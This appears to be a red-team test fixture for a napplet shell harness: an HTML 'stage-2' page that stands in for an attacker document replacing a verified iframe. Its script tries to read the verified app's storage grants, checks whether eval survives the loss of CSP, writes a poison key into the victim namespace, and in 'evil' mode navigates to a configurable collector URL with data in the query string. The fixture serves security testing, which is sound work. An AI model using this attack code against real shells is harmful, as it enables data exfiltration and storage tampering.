@@ -1,0 +1,124 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>evil-09 stage-2 — network replacement target</title>
+<!--
+  evil-napplets victim-shell test fixture. This page stands in for the
+  attacker-controlled page in the evil-09 frame self-replacement attack:
+  a document fetched over plain http(s) with NO CSP — exactly what a
+  Window-keyed shell serves the verified napplet's grants to after the
+  napplet navigates its own frame to it. These bytes were never verified
+  against any manifest x tag. Red-team lab only: it talks to the harness
+  (its parent) and, in VERY EVIL mode, to the configured collector.
+-->
+<style>
+  :root { --bg:#120f16; --fg:#e9e6f2; --danger:#ff5470; --ok:#3fd68f; --warn:#ffb454; --muted:#8d88a3; --border:#3a3350; color-scheme: dark; font:12.5px/1.45 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
+  body { margin:0; background:var(--bg); color:var(--fg); padding:8px; user-select:text; }
+  .banner { border:1px solid var(--danger); color:var(--danger); font-weight:700; padding:6px 8px; border-radius:6px; margin-bottom:8px; }
+  .attack { border:1px solid var(--border); border-radius:6px; padding:8px; margin-bottom:6px; background:rgba(255,84,112,.05); }
+  .attack.armed { border-color:rgba(255,84,112,.6); }
+  .head { display:flex; gap:8px; align-items:center; flex-wrap:wrap; }
+  .name { font-weight:700; }
+  .chip { border:1px solid var(--border); border-radius:4px; font-size:10px; text-transform:uppercase; letter-spacing:.04em; padding:1px 6px; white-space:nowrap; }
+  .chip.armed { color:var(--danger); border-color:var(--danger); }
+  .chip.blocked { color:var(--ok); border-color:var(--ok); }
+  .chip.na { color:var(--muted); }
+  .evidence { color:var(--muted); font-size:11px; margin-top:4px; overflow-wrap:anywhere; }
+  #evilLog { border:1px solid var(--danger); border-radius:6px; padding:8px; font-size:11px; white-space:pre-wrap; margin-top:8px; }
+  .note { color:var(--muted); font-size:11px; margin-top:8px; }
+</style>
+</head>
+<body>
+<div class="banner">&#9888; STAGE-2 — the replacement document (network stand-in). This page was fetched over HTTP with no CSP and was never verified against any manifest. A Window-keyed shell still calls this frame (<span id="dtag">…</span>, artifactHash).</div>
+<div id="rows"></div>
+<div id="evilLog" hidden></div>
+<div class="note">the verified napplet is gone — its UI died with the document it was bound to. Reload the napplet from the harness to restore it.</div>
+<script>
+'use strict';
+(function () {
+  const Q = new URLSearchParams(location.search);
+  const C = {
+    mode: Q.get('mode') || 'demo',
+    marker: Q.get('marker') || '',
+    cspBefore: Q.get('csp') || 'none',
+    dTag: Q.get('dTag') || 'unknown',
+    collector: Q.get('collector') || '',
+    data: Q.get('data') || '',
+  };
+  document.getElementById('dtag').textContent = C.dTag;
+  function esc(s) { return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;'); }
+  function post(m) { try { window.parent.postMessage(m, '*'); } catch (_) {} }
+  function row(id, name, st, ev) {
+    const d = document.createElement('div');
+    d.className = 'attack' + (st === 'armed' ? ' armed' : '');
+    d.dataset.attack = id;
+    d.dataset.status = st;
+    d.innerHTML = '<div class="head"><span class="chip ' + st + '">' + (st === 'armed' ? 'ARMED' : st === 'blocked' ? 'HELD' : 'N/A') + '</span><span class="name">' + name + '</span></div><div class="evidence">' + ev + '</div>';
+    document.getElementById('rows').appendChild(d);
+  }
+  function fullReport() {
+    const out = { stage: 'stage-2', mode: C.mode, via: 'network-nav', rows: {} };
+    document.querySelectorAll('.attack').forEach((el) => { out.rows[el.dataset.attack] = el.dataset.status; });
+    return out;
+  }
+  function rawNap(type, key, value) {
+    return new Promise((res) => {
+      const id = 's2-' + Math.random().toString(16).slice(2, 10);
+      const on = (e) => { const d = e.data; if (d && d.id === id) { window.removeEventListener('message', on); res(d); } };
+      window.addEventListener('message', on);
+      const msg = { type: type, id: id, key: key };
+      if (arguments.length > 2) msg.value = value;
+      post(msg);
+      setTimeout(() => { window.removeEventListener('message', on); res(null); }, 2500);
+    });
+  }
+  row('replaced-document', 'document replaced in-frame', 'armed',
+    'this document was fetched over the network from ' + esc(location.origin + location.pathname) + ' — NOT the verified srcdoc bytes. The iframe Window never changed, so a shell that maps (dTag, artifactHash) to the Window still treats these bytes as ' + esc(C.dTag) + '.');
+  post({ type: 'evil.stage2.report', report: fullReport() });
+  async function main() {
+    const r = await rawNap('storage.get', '__evil09_victim__');
+    if (r && r.value != null) {
+      row('grant-inheritance', 'identity & grant inheritance', 'armed',
+        'raw window-level storage.get from UNVERIFIED bytes was ACCEPTED and served from the VERIFIED napplet\u2019s namespace: ' + esc(String(r.value).slice(0, 32)) + ' (' + String(r.value).length + ' chars). The shell cannot tell this document from the artifact it verified.');
+    } else {
+      row('grant-inheritance', 'identity & grant inheritance', 'blocked',
+        'no reply to the raw window-level NAP request' + (r && r.error ? ' (error: ' + esc(r.error) + ')' : '') + ' — the shell refused the replacement document. Identity did not survive the replacement.');
+    }
+    let evalHere = 'blocked';
+    try { if (eval('2 + 2') === 4) evalHere = 'open'; } catch (_) {}
+    if (evalHere === 'open' && C.cspBefore === 'blocked') {
+      row('csp-evaporation', 'injected meta CSP evaporation', 'armed',
+        'eval() was CSP-BLOCKED in the verified document, but it RUNS HERE — this HTTP response carries no CSP, and the injected meta died with the verified document. Every evil-02 egress channel re-opens for replacement bytes. (Scheme-local replacements — data:/blob: — inherit Chromium\u2019s policy container and keep the CSP; the network path does not.)');
+    } else if (evalHere === 'open') {
+      row('csp-evaporation', 'injected meta CSP evaporation', 'na',
+        'eval() runs here, but the verified document had no CSP injected either (csp knob off) — evaporation unprovable in this run; detonate with the CSP meta on.');
+    } else {
+      row('csp-evaporation', 'injected meta CSP evaporation', 'blocked',
+        'eval() is still blocked in this replacement document — but see grant inheritance for what still leaked.');
+    }
+    if (C.marker && decodeURIComponent(String(location.search)).indexOf(C.marker) > -1) {
+      row('url-disclosure', 'navigation-URL data disclosure', 'armed',
+        'data the verified napplet legitimately read was encoded into this frame\u2019s navigation URL and arrived here in location.search: ' + esc(String(C.marker).slice(0, 48)) + '. A remote attacker page would have received it the same way — no CSP directive governs a frame navigating itself, and post-#14 revocation cannot recall what the URL already carried.');
+    } else {
+      row('url-disclosure', 'navigation-URL data disclosure', 'na', 'no marker found in this URL');
+    }
+    post({ type: 'evil.stage2.report', report: fullReport() });
+    if (C.mode === 'evil') {
+      const log = document.getElementById('evilLog');
+      log.hidden = false;
+      const line = (s) => { log.textContent += '[' + new Date().toISOString() + '] ' + s + '\n'; };
+      line('VERY EVIL stage-2 executing from UNVERIFIED bytes as ' + C.dTag);
+      const pr = await rawNap('storage.set', '__evil09_poison__', 'attacker-data-written-by-UNVERIFIED-bytes');
+      line('namespace poison: ' + (pr && pr.value === true ? 'WROTE __evil09_poison__ into the verified napplet\u2019s namespace — the next legit load inherits it' : 'refused/dropped (' + (pr && pr.error ? pr.error : 'no reply') + ') — the runtime holds'));
+      line('navigation-URL exfil: ' + C.collector + '?ev=evil09-nav-exfil&d=<data>');
+      line('finished. everything above actually happened.');
+      post({ type: 'evil.stage2.report', report: fullReport() });
+      setTimeout(() => { location.href = C.collector + '?ev=evil09-nav-exfil&d=' + encodeURIComponent(C.data || 'no-data'); }, 1200);
+    }
+  }
+  main();
+})();
+</script>
+</body>
+</html>
